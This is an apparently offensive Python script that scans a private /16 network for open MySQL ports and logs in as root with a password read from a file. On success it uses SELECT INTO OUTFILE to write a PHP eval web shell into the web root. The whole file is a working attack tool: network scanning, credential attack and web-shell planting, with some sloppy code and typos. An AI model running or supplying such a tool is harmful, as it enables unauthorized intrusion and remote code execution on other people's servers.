import socket
import pymysql

def nmap(host):
    s = socket.socket()
    try:
        s.connect((host, 3306))
        print(host, "'s 3306 is open !")
        return 1
    except Exception as e:
        print(host, "'s 3306 is cloes!")
        return 0

def mysqk_login(host, userName, Password):
    try:
        db = pymysql.connect(host=host, user=userName, password=Password)
        db.close()
        print(host, ":", userName, "passwd is ", Password)
        return 1
    except Exception as e:
        print("worry")
        return 0

def mysql_exec(host, userName, Password):
    try:
        db = pymysql.connect(host=host, user=userName, password=Password)
        cursor = db.cursor()
        cursor.execute("select \"<?php @eval($_POST['1']); ?>\" into outfile \"F:\WWW\shell.php\";")
        data = cursor.fetchone()
        print("ok", data)
        db.close()
    except Exception as e:
        pass

def main():
    for p1 in range(172,173):
        for p2 in range(16,17):
            for p3 in range(0,255):
                for p4 in range(0,255):
                    nip='{}.{}.{}.{}'.format(p1,p2,p3,p4)
                    host = nip
                    if nmap(host) == 1:
                        try:
                            username = "root"
                            f=open('1.txt','r')
                            password=f.readline().strip()
                            if mysqk_login(host, username, password) == 1:
                                passhost = host
                                passusername = username
                                passpassword = password
                                mysql_exec(passhost, passusername, passpassword)     
                        except mysqk_login(host, username, password) == 0:
                            pass                 
                    elif nmap(host) == 0:
                        pass

if __name__ == '__main__':
    main()
